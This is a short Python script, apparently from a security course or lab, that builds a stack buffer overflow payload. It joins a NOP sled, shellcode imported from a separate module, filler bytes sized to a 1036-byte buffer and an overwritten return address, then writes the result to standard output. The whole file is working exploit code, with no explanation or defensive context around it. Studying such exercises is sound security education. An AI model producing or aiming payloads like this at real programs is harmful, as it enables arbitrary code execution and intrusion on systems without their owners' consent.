from struct import pack
import sys
from shellcode import shellcode

# NOP sled for flexibility
nop_slide = b"\x90" * 256

# Padding to fill the buffer
buffer_size = 1036
padding = b"A" * (buffer_size - len(nop_slide + shellcode))
return_addr = pack("<I", 0xfffe8c10)
payload = nop_slide + shellcode + padding + return_addr
sys.stdout.buffer.write(payload)

    

